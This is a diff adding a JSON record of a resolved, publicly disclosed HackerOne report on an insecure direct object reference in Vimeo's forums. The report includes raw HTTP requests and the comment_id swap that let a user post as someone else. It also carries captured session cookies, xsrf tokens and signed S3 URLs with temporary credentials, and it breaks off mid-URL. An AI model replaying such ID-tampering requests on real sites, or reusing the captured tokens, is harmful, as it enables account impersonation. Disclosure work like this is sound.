@@ -1,0 +1,158 @@
+{
+  "id": 52176,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MjE3Ng==",
+  "url": "https://hackerone.com/reports/52176",
+  "title": "Insecure Direct Object References in https://vimeo.com/forums",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2015-03-16T10:55:05.899Z",
+  "submitted_at": "2015-03-16T10:55:05.899Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "patrik",
+    "url": "/patrik",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ocb2n6ptlw1lh0t55azkm7x46mqk/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 56,
+    "url": "https://hackerone.com/vimeo",
+    "handle": "vimeo",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/056/c3188aa0fc4a95fd486b5ee1f4b2d0b90da111d3_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/056/c3188aa0fc4a95fd486b5ee1f4b2d0b90da111d3_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Vimeo",
+      "twitter_handle": "vimeo",
+      "website": "https://vimeo.com",
+      "about": "Make life worth watching"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2015-05-04T16:51:07.369Z",
+  "bug_reporter_agreed_on_going_public_at": "2015-04-28T20:47:59.976Z",
+  "team_member_agreed_on_going_public_at": "2015-05-04T16:51:02.304Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Insecure Direct Object References\r\n\r\nDear Vimeo Team, i recently discovered a bug which allowed me to send comments in the forum in behalf on any user\r\n\r\nThe trick here is to create a comment with your account Post it, and press on Edit :\r\n\r\nGET /forums/wanted_and_offered/topic:130606?comment_id=13010973&is_sticky=0&action=comment_edit_form HTTP/1.1\r\nHost: vimeo.com\r\nConnection: keep-alive\r\nAccept: text/html, application/xml, text/xml, */*\r\nX-Requested-With: XMLHttpRequest\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36\r\nReferer: https://vimeo.com/forums/wanted_and_offered/topic:130606\r\nAccept-Encoding: gzip, deflate, sdch\r\nAccept-Language: de-DE,de;q=0.8,en-US;q=0.6,en;q=0.4,it;q=0.2\r\nCookie: _abexps=%7B%2248%22%3A%22%22%7D; auto_load_stats=1; clips=119241865; notification_53=1426502158; vimeo=epkmdcsskk70pcdx9tsxc297jpcdx9tsxc297l5i_e%2C5apc7%2Cp5c9kdw5mkvsfsxrdxwwwum05m500vrrt2usmxduw; vimeo_player=eypkmdcsskk70pcdx9tsxxxc7jpcdx9tsxxxc7%2Cpkmk0kr9sd25tdkfwcsx2mcrw50wrv0c9r9t90ccm; last_page=%2Fhome; has_logged_in=1; stats_start_date=2015%2F03%2F12; stats_end_date=2015%2F03%2F16; search_ref=121392801; xsrft=6e2b01771ab39f0663cd6863d69217e1.2747550b08185735962e460fafcbae86; vod_s=%7B%22start_location%22%3A%22container%22%2C%22referrer%22%3A%22https%3A%5C%2F%5C%2Fvimeo.com%5C%2Fsearch%3Fq%3D%2522%2522%2522%2522%2522%2522%2522%253E%253Cimg%2520src%253Dx%22%2C%22id%22%3A31912%7D; player=\"captions=af.captions\"; vuid=944960715.120820070; __utma=18302654.581098069.1426499521.1426499521.1426502225.2; __utmb=18302654.17.9.1426502473945; __utmc=18302654; __utmz=18302654.1426502225.2.2.utmcsr=email|utmccn=1091|utmcmd=vimeo-intro-welcome-20130100; __utmv=18302654.|2=user_type=basic=1^3=ms=0=1^7=video_count=0=1^10=vuid=944960715.120820070=1; __utmli=comment\r\n\r\n\r\n\r\nYou will get something like this, if you now change the ID=13010973 Part to 13010972, you will be redirected to the Post of the originated User, \r\n\r\nPimped &amp; posted ;-) http://thekitesurfchannel.com/videos/i-am-gold-episode-2/ \r\n\r\nThis one if you then Click on Post and intercept this particular message again, you will get the following Message, and the Message get's posted\r\n\r\nPOST /121947416 HTTP/1.1\r\nHost: vimeo.com\r\nConnection: keep-alive\r\nContent-Length: 619\r\nAccept: text/html, application/xml, text/xml, */*\r\nOrigin: https://vimeo.com\r\nX-Requested-With: XMLHttpRequest\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36\r\nContent-type: application/x-www-form-urlencoded; charset=UTF-8\r\nReferer: https://vimeo.com/forums/wanted_and_offered/topic:130606\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: de-DE,de;q=0.8,en-US;q=0.6,en;q=0.4,it;q=0.2\r\nCookie: _abexps=%7B%2248%22%3A%22%22%7D; auto_load_stats=1; clips=119241865; notification_53=1426502158; vimeo=epkmdcsskk70pcdx9tsxc297jpcdx9tsxc297l5i_e%2C5apc7%2Cp5c9kdw5mkvsfsxrdxwwwum05m500vrrt2usmxduw; vimeo_player=eypkmdcsskk70pcdx9tsxxxc7jpcdx9tsxxxc7%2Cpkmk0kr9sd25tdkfwcsx2mcrw50wrv0c9r9t90ccm; has_logged_in=1; stats_start_date=2015%2F03%2F12; stats_end_date=2015%2F03%2F16; search_ref=121392801; xsrft=6e2b01771ab39f0663cd6863d69217e1.2747550b08185735962e460fafcbae86; vod_s=%7B%22start_location%22%3A%22container%22%2C%22referrer%22%3A%22https%3A%5C%2F%5C%2Fvimeo.com%5C%2Fsearch%3Fq%3D%2522%2522%2522%2522%2522%2522%2522%253E%253Cimg%2520src%253Dx%22%2C%22id%22%3A31912%7D; player=\"captions=af.captions\"; vuid=944960715.120820070; __utma=18302654.581098069.1426499521.1426499521.1426502225.2; __utmb=18302654.20.9.1426502473945; __utmc=18302654; __utmz=18302654.1426502225.2.2.utmcsr=email|utmccn=1091|utmcmd=vimeo-intro-welcome-20130100; __utmv=18302654.|2=user_type=basic=1^3=ms=0=1^7=video_count=0=1^10=vuid=944960715.120820070=1; xsrft=3a0822b94e27d8255ada31b02cc43ddc.2747550b08185735962e460fafcbae86\r\n\r\ntext=Pimped%20%26%20posted%20%3B-)%20http%3A%2F%2Fthekitesurfchannel.com%2Fvideos%2Fi-am-gold-episode-2%2F&action=edit_comment&comment_id=13010973&token=3a0822b94e27d8255ada31b02cc43ddc.2747550b08185735962e460fafcbae86&version=%7B%22name%22%3A%22chrome%22%2C%22version%22%3A41%2C%22Platform%22%3A%7B%22name%22%3A%22mac%22%2C%22mac%22%3Atrue%7D%2C%22Features%22%3A%7B%22xpath%22%3Atrue%2C%22air%22%3Afalse%2C%22query%22%3Atrue%2C%22json%22%3Atrue%2C%22xhr%22%3Atrue%7D%2C%22Plugins%22%3A%7B%22Flash%22%3A%7B%22version%22%3A17%2C%22build%22%3A0%7D%7D%2C%22chrome%22%3Atrue%2C%22chrome41%22%3Atrue%2C%22loaded%22%3Atrue%7D\r\n\r\nYou will see the Output in the pictures, but i will do a POC as a movie aswell\r\n",
+  "weakness": {
+    "id": 27,
+    "name": "Improper Authentication - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 32216,
+      "file_name": "Bildschirmfoto_2015-03-16_um_11.48.06.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/032/216/bc1dfdddc101305531e7089c2d77a837eaaee23b/Bildschirmfoto_2015-03-16_um_11.48.06.png?response-content-disposition=attachment%3B%20filename%3D%22Bildschirmfoto_2015-03-16_um_11.48.06.png%22%3B%20filename%2A%3DUTF-8%27%27Bildschirmfoto_2015-03-16_um_11.48.06.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUALXWHCY%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T124315Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGEZaqRW4AJwaoHxBX7vjIWelKKgia6k3Pd%2FrB1IzKJyAiEAqmo6M%2FAo3hybDISCVo1SXdvZ43RP9D6wN81lmO3qlLgqugUInP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBane0uTKx%2Fizoe1ZiqOBTktflM3%2BAxjpgXUuNZhBOeyrIw%2Bf%2BgZrp5qT6FvK8ghFVagAzVNvSgP34vbRFNRPlLns2bBpwMUxO65SXHf9XEjhN8eWmbvU2Yq%2BbYcsUNYhbsU2SD5dYoU%2FYGPDVEW36sGZ4Y%2FRjUX%2FxnGzUrk8eduSIX9a4McDsF%2B0s9Lh2mM%2FkZ%2FecFPfEAxLA3I9Qotl4utrJvPI74wZpfOVaF290fvUhB57gAwYJgMQqz9Y9WuHeW3YrfSYHgSvCKLn2j200Cf9Vhr8LH9bpuQI77ogMDNuhrluIAdB%2BdCZM3mGXbdZrn6aolcntsV2LvmkGWfIJo5Cj3%2F5O6V1h%2FCoMyuJALFpiKAlQ4EOMLxdtaMh5CyiwZoOg9D72wVuxctqAc5rfUrl%2F3pV1lHdLdtnQQnuAhcuRQfeIPVDvbCz7VWNyshvauRhsbmAjSiAsIHwjQt9xOTcW0EkqRTYZHKtEO2%2F9SPfG47t0gF8XpIN%2BipjGs0pIY3uH6J%2BZ5S3UXicAwXuzh%2BHEZ8doBClrHsssF21p6daKBXcd1znPR9P%2BZk%2BoYZPX6iOn9mrtvwlC%2BqGbQSUL0bj9EpusdDwqu5edcN%2Fp%2FPReb57KrC%2FOzSno0zCHvnA8LcBVCw0DJjgwzgei%2B7Zxu1GwWH3OXznImEHqs3d71JgY2pRmEQb7YU9o%2BbWn8IagXyCYJqzQ5HYJsBQqHigRdSpnoeAouPMSgBBLeaHACyrmK6byVbmJG5QkJ0TGw7tzcZRDxz9bjoQZb28uNZssLNVTbMyTs%2Fq7f9tGKIBExQ%2FhxyMJPhnAtAMiQl17zYL7fccFIDuEgX7dC5fW7eB1TxoWwSJslOIxA489IoqShiWW4C5WuXegHr1FaomjDAlpXRBjqxAfNygmQNRaiF9INLKk%2BcaS23vonHOr%2BipIKetXJYgKYlwyteUD9ASHAAkVNvmlu336eV90VO4uqJ%2Bw%2Bz%2BtDFV0%2F%2F0qPHnIaKWAOURTj6HRhbxTUaFCP2pUoALzl5TeRDr66m%2FOIACNVbDSyl7kPiudyh%2BgJsDgknPntz20%2FDVLZ1nTO5GS84g%2FG%2F%2BNUkZR8rA7JGSTd9w%2FzCS0RSt7sjht10r4uVG7STKAs%2Bqrn6uWuXBQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bd1000a4771d1ed32cc04787272563f87007829b8f701168c98ae03589b583d2",
+      "file_size": 66909,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 32217,
+      "file_name": "Bildschirmfoto_2015-03-13_um_12.53.34.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/032/217/a306c46ffa3df8371da97d772b0605032bec423b/Bildschirmfoto_2015-03-13_um_12.53.34.png?response-content-disposition=attachment%3B%20filename%3D%22Bildschirmfoto_2015-03-13_um_12.53.34.png%22%3B%20filename%2A%3DUTF-8%27%27Bildschirmfoto_2015-03-13_um_12.53.34.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUALXWHCY%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T124315Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGEZaqRW4AJwaoHxBX7vjIWelKKgia6k3Pd%2FrB1IzKJyAiEAqmo6M%2FAo3hybDISCVo1SXdvZ43RP9D6wN81lmO3qlLgqugUInP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBane0uTKx%2Fizoe1ZiqOBTktflM3%2BAxjpgXUuNZhBOeyrIw%2Bf%2BgZrp5qT6FvK8ghFVagAzVNvSgP34vbRFNRPlLns2bBpwMUxO65SXHf9XEjhN8eWmbvU2Yq%2BbYcsUNYhbsU2SD5dYoU%2FYGPDVEW36sGZ4Y%2FRjUX%2FxnGzUrk8eduSIX9a4McDsF%2B0s9Lh2mM%2FkZ%2FecFPfEAxLA3I9Qotl4utrJvPI74wZpfOVaF290fvUhB57gAwYJgMQqz9Y9WuHeW3YrfSYHgSvCKLn2j200Cf9Vhr8LH9bpuQI77ogMDNuhrluIAdB%2BdCZM3mGXbdZrn6aolcntsV2LvmkGWfIJo5Cj3%2F5O6V1h%2FCoMyuJALFpiKAlQ4EOMLxdtaMh5CyiwZoOg9D72wVuxctqAc5rfUrl%2F3pV1lHdLdtnQQnuAhcuRQfeIPVDvbCz7VWNyshvauRhsbmAjSiAsIHwjQt9xOTcW0EkqRTYZHKtEO2%2F9SPfG47t0gF8XpIN%2BipjGs0pIY3uH6J%2BZ5S3UXicAwXuzh%2BHEZ8doBClrHsssF21p6daKBXcd1znPR9P%2BZk%2BoYZPX6iOn9mrtvwlC%2BqGbQSUL0bj9EpusdDwqu5edcN%2Fp%2FPReb57KrC%2FOzSno0zCHvnA8LcBVCw0DJjgwzgei%2B7Zxu1GwWH3OXznImEHqs3d71JgY2pRmEQb7YU9o%2BbWn8IagXyCYJqzQ5HYJsBQqHigRdSpnoeAouPMSgBBLeaHACyrmK6byVbmJG5QkJ0TGw7tzcZRDxz9bjoQZb28uNZssLNVTbMyTs%2Fq7f9tGKIBExQ%2FhxyMJPhnAtAMiQl17zYL7fccFIDuEgX7dC5fW7eB1TxoWwSJslOIxA489IoqShiWW4C5WuXegHr1FaomjDAlpXRBjqxAfNygmQNRaiF9INLKk%2BcaS23vonHOr%2BipIKetXJYgKYlwyteUD9ASHAAkVNvmlu336eV90VO4uqJ%2Bw%2Bz%2BtDFV0%2F%2F0qPHnIaKWAOURTj6HRhbxTUaFCP2pUoALzl5TeRDr66m%2FOIACNVbDSyl7kPiudyh%2BgJsDgknPntz20%2FDVLZ1nTO5GS84g%2FG%2F%2BNUkZR8rA7JGSTd9w%2FzCS0RSt7sjht10r4uVG7STKAs%2Bqrn6uWuXBQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=28ffe7885eca978dabf58975e20c8866e960ca7ec76036f3476f540a47096404",
+      "file_size": 89559,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 32218,
+      "file_name": "Bildschirmfoto_2015-03-16_um_11.48.31.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/032/218/9bb3deb7ecba6ac71b1f3f9a6a04a5c7dac96705/Bildschirmfoto_2015-03-16_um_11.48.31.png?response-content-disposition=attachment%3B%20filename%3D%22Bildschirmfoto_2015-03-16_um_11.48.31.png%22%3B%20filename%2A%3DUTF-8%27%27Bildschirmfoto_2015-03-16_um_11.48.31.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUALXWHCY%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T124315Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGEZaqRW4AJwaoHxBX7vjIWelKKgia6k3Pd%2FrB1IzKJyAiEAqmo6M%2FAo3hybDISCVo1SXdvZ43RP9D6wN81lmO3qlLgqugUInP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBane0uTKx%2Fizoe1ZiqOBTktflM3%2BAxjpgXUuNZhBOeyrIw%2Bf%2BgZrp5qT6FvK8ghFVagAzVNvSgP34vbRFNRPlLns2bBpwMUxO65SXHf9XEjhN8eWmbvU2Yq%2BbYcsUNYhbsU2SD5dYoU%2FYGPDVEW36sGZ4Y%2FRjUX%2FxnGzUrk8eduSIX9a4McDsF%2B0s9Lh2mM%2FkZ%2FecFPfEAxLA3I9Qotl4utrJvPI74wZpfOVaF290fvUhB57gAwYJgMQqz9Y9WuHeW3YrfSYHgSvCKLn2j200Cf9Vhr8LH9bpuQI77ogMDNuhrluIAdB%2BdCZM3mGXbdZrn6aolcntsV2LvmkGWfIJo5Cj3%2F5O6V1h%2FCoMyuJALFpiKAlQ4EOMLxdtaMh5CyiwZoOg9D72wVuxctqAc5rfUrl%2F3pV1lHdLdtnQQnuAhcuRQfeIPVDvbCz7VWNyshvauRhsbmAjSiAsIHwjQt9xOTcW0EkqRTYZHKtEO2%2F9SPfG47t0gF8XpIN%2BipjGs0pIY3uH6J%2BZ5S3UXicAwXuzh%2BHEZ8doBClrHsssF21p6daKBXcd1znPR9P%2BZk%2BoYZPX6iOn9mrtvwlC%2BqGbQSUL0bj9EpusdDwqu5edcN%2Fp%2FPReb57KrC%2FOzSno0zCHvnA8LcBVCw0DJjgwzgei%2B7Zxu1GwWH3OXznImEHqs3d71JgY2pRmEQb7YU9o%2BbWn8IagXyCYJqzQ5HYJsBQqHigRdSpnoeAouPMSgBBLeaHACyrmK6byVbmJG5QkJ0TGw7tzcZRDxz9bjoQZb28uNZssLNVTbMyTs%2Fq7f9tGKIBExQ%2FhxyMJPhnAtAMiQl17zYL7fccFIDuEgX7dC5fW7eB1TxoWwSJslOIxA489IoqShiWW4C5WuXegHr1FaomjDAlpXRBjqxAfNygmQNRaiF9INLKk%2BcaS23vonHOr%2BipIKetXJYgKYlwyteUD9ASHAAkVNvmlu336eV90VO4uqJ%2Bw%2Bz%2BtDFV0%2F%2F0qPHnIaKWAOURTj6HRhbxTUaFCP2pUoALzl5TeRDr66m%2FOIACNVbDSyl7kPiudyh%2BgJsDgknPntz20%2FDVLZ1nTO5GS84g%2FG%2F%2BNUkZR8rA7JGSTd9w%2FzCS0RSt7sjht10r4uVG7STKAs%2Bqrn6uWuXBQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=86e31599b3140d3dbc73409aa08ca570bce0a4464719ef4f2dd3bdfe8d2208f8",
+      "file_size": 103219,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 32219,
+      "file_name": "Bildschirmfoto_2015-03-16_um_11.48.52.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/032/219/48e7974cdf73153a8b00edf6f2ac0a96a3c87347/Bildschirmfoto_2015-03-16_um_11.48.52.png?response-content-disposition=attachment%3B%20filename%3D%22Bildschirmfoto_2015-03-16_um_11.48.52.png%22%3B%20filename%2A%3DUTF-8%27%27Bildschirmfoto_2015-03-16_um_11.48.52.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUALXWHCY%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T124315Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGEZaqRW4AJwaoHxBX7vjIWelKKgia6k3Pd%2FrB1IzKJyAiEAqmo6M%2FAo3hybDISCVo1SXdvZ43RP9D6wN81lmO3qlLgqugUInP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBane0uTKx%2Fizoe1ZiqOBTktflM3%2BAxjpgXUuNZhBOeyrIw%2Bf%2BgZrp5qT6FvK8ghFVagAzVNvSgP34vbRFNRPlLns2bBpwMUxO65SXHf9XEjhN8eWmbvU2Yq%2BbYcsUNYhbsU2SD5dYoU%2FYGPDVEW36sGZ4Y%2FRjUX%2FxnGzUrk8eduSIX9a4McDsF%2B0s9Lh2mM%2FkZ%2FecFPfEAxLA3I9Qotl4utrJvPI74wZpfOVaF290fvUhB57gAwYJgMQqz9Y9WuHeW3YrfSYHgSvCKLn2j200Cf9Vhr8LH9bpuQI77ogMDNuhrluIAdB%2BdCZM3mGXbdZrn6aolcntsV2LvmkGWfIJo5Cj3%2F5O6V1h%2FCoMyuJALFpiKAlQ4EOMLxdtaMh5CyiwZoOg9D72wVuxctqAc5rfUrl%2F3pV1lHdLdtnQQnuAhcuRQfeIPVDvbCz7VWNyshvauRhsbmAjSiAsIHwjQt9xOTcW0EkqRTYZHKtEO2%2F9SPfG47t0gF8XpIN%2BipjGs0pIY3uH6J%2BZ5S3UXicAwXuzh%2BHEZ8doBClrHsssF21p6daKBXcd1znPR9P%2BZk%2BoYZPX6iOn9mrtvwlC%2BqGbQSUL0bj9EpusdDwqu5edcN%2Fp%2FPReb57KrC%2FOzSno0zCHvnA8LcBVCw0DJjgwzgei%2B7Zxu1GwWH3OXznImEHqs3d71JgY2pRmEQb7YU9o%2BbWn8IagXyCYJqzQ5HYJsBQqHigRdSpnoeAouPMSgBBLeaHACyrmK6byVbmJG5QkJ0TGw7tzcZRDxz9bjoQZb28uNZssLNVTbMyTs%2Fq7f9tGKIBExQ%2FhxyMJPhnAtAMiQl17zYL7fccFIDuEgX7dC5fW7eB1TxoWwSJslOIxA489IoqShiWW4C5WuXegHr1FaomjDAlpXRBjqxAfNygmQNRaiF9INLKk%2BcaS23vonHOr%2BipIKetXJYgKYlwyteUD9ASHAAkVNvmlu336eV90VO4uqJ%2Bw%2Bz%2BtDFV0%2F%2F0qPHnIaKWAOURTj6HRhbxTUaFCP2pUoALzl5TeRDr66m%2FOIACNVbDSyl7kPiudyh%2BgJsDgknPntz20%2FDVLZ1nTO5GS84g%2FG%2F%2BNUkZR8rA7JGSTd9w%2FzCS0RSt7sjht10r4uVG7STKAs%2Bqrn6uWuXBQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=197a06a13ad7a6554af717f9057ca202e835048da78d6c81b6d8f90c9a838986",
+      "file_size": 40165,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 32220,
+      "file_name": "Bildschirmfoto_2015-03-16_um_11.49.10.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/032/220/1c21876b05be2c408df0df505da8d9d54df4d40c/Bildschirmfoto_2015-03-16_um_11.49.10.png?response-content-disposition=attachment%3B%20filename%3D%22Bildschirmfoto_2015-03-16_um_11.49.10.png%22%3B%20filename%2A%3DUTF-8%27%27Bildschirmfoto_2015-03-16_um_11.49.10.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUALXWHCY%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T124315Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGEZaqRW4AJwaoHxBX7vjIWelKKgia6k3Pd%2FrB1IzKJyAiEAqmo6M%2FAo3hybDISCVo1SXdvZ43RP9D6wN81lmO3qlLgqugUInP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBane0uTKx%2Fizoe1ZiqOBTktflM3%2BAxjpgXUuNZhBOeyrIw%2Bf%2BgZrp5qT6FvK8ghFVagAzVNvSgP34vbRFNRPlLns2bBpwMUxO65SXHf9XEjhN8eWmbvU2Yq%2BbYcsUNYhbsU2SD5dYoU%2FYGPDVEW36sGZ4Y%2FRjUX%2FxnGzUrk8eduSIX9a4McDsF%2B0s9Lh2mM%2FkZ%2FecFPfEAxLA3I9Qotl4utrJvPI74wZpfOVaF290fvUhB57gAwYJgMQqz9Y9WuHeW3YrfSYHgSvCKLn2j200Cf9Vhr8LH9bpuQI77ogMDNuhrluIAdB%2BdCZM3mGXbdZrn6aolcntsV2LvmkGWfIJo5Cj3%2F5O6V1h%2FCoMyuJALFpiKAlQ4EOMLxdtaMh5CyiwZoOg9D72wVuxctqAc5rfUrl%2F3pV1lHdLdtnQQnuAhcuRQfeIPVDvbCz7VWNyshvauRhsbmAjSiAsIHwjQt9xOTcW0EkqRTYZHKtEO2%2F9SPfG47t0gF8XpIN%2BipjGs0pIY3uH6J%2BZ5S3UXicAwXuzh%2BHEZ8doBClrHsssF21p6daKBXcd1znPR9P%2BZk%2BoYZPX6iOn9mrtvwlC%2BqGbQSUL0bj9EpusdDwqu5edcN%2Fp%2FPReb57KrC%2FOzSno0zCHvnA8LcBVCw0DJjgwzgei%2B7Zxu1GwWH3OXznImEHqs3d71JgY2pRmEQb7YU9o%2BbWn8IagXyCYJqzQ5HYJsBQqHigRdSpnoeAouPMSgBBLeaHACyrmK6byVbmJG5QkJ0TGw7tzcZRDxz9bjoQZb28uNZssLNVTbMyTs%2Fq7f9tGKIBExQ%2FhxyMJPhnAtAMiQl17zYL7fccFIDuEgX7dC5fW7eB1TxoWwSJslOIxA489IoqShiWW4C5WuXegHr1FaomjDAlpXRBjqxAfNygmQNRaiF9INLKk%2BcaS23vonHOr%2BipIKetXJYgKYlwyteUD9ASHAAkVNvmlu336eV90VO4uqJ%2Bw%2Bz%2BtDFV0%2F%2F0qPHnIaKWAOURTj6HRhbxTUaFCP2pUoALzl5TeRDr66m%2FOIACNVbDSyl7kPiudyh%2BgJsDgknPntz20%2FDVLZ1nTO5GS84g%2FG%2F%2BNUkZR8rA7JGSTd9w%2FzCS0RSt7sjht10r4uVG7STKAs%2Bqrn6uWuXBQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=43707e61be2662cd8ca5faf67ae649d3de09ab000be416fc45c430226314e74f",
+      "file_size": 56246,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 32221,
+      "file_name": "Bildschirmfoto_2015-03-16_um_11.49.28.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/032/221/17dd3330ee2b0aee7d57ce451979d3efd33d6a64/Bildschirmfoto_2015-03-16_um_11.49.28.png?response-content-disposition=attachment%3B%20filename%3D%22Bildschirmfoto_2015-03-16_um_11.49.28.png%22%3B%20filename%2A%3DUTF-8%27%27Bildschirmfoto_2015-03-16_um_11.49.28.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUALXWHCY%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T124315Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGEZaqRW4AJwaoHxBX7vjIWelKKgia6k3Pd%2FrB1IzKJyAiEAqmo6M%2FAo3hybDISCVo1SXdvZ43RP9D6wN81lmO3qlLgqugUInP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBane0uTKx%2Fizoe1ZiqOBTktflM3%2BAxjpgXUuNZhBOeyrIw%2Bf%2BgZrp5qT6FvK8ghFVagAzVNvSgP34vbRFNRPlLns2bBpwMUxO65SXHf9XEjhN8eWmbvU2Yq%2BbYcsUNYhbsU2SD5dYoU%2FYGPDVEW36sGZ4Y%2FRjUX%2FxnGzUrk8eduSIX9a4McDsF%2B0s9Lh2mM%2FkZ%2FecFPfEAxLA3I9Qotl4utrJvPI74wZpfOVaF290fvUhB57gAwYJgMQqz9Y9WuHeW3YrfSYHgSvCKLn2j200Cf9Vhr8LH9bpuQI77ogMDNuhrluIAdB%2BdCZM3mGXbdZrn6aolcntsV2LvmkGWfIJo5Cj3%2F5O6V1h%2FCoMyuJALFpiKAlQ4EOMLxdtaMh5CyiwZoOg9D72wVuxctqAc5rfUrl%2F3pV1lHdLdtnQQnuAhcuRQfeIPVDvbCz7VWNyshvauRhsbmAjSiAsIHwjQt9xOTcW0EkqRTYZHKtEO2%2F9SPfG47t0gF8XpIN%2BipjGs0pIY3uH6J%2BZ5S3UXicAwXuzh%2BHEZ8doBClrHsssF21p6daKBXcd1znPR9P%2BZk%2BoYZPX6iOn9mrtvwlC%2BqGbQSUL0bj9EpusdDwqu5edcN%2Fp%2FPReb57KrC%2FOzSno0zCHvnA8LcBVCw0DJjgwzgei%2B7Zxu1GwWH3OXznImEHqs3d71JgY2pRmEQb7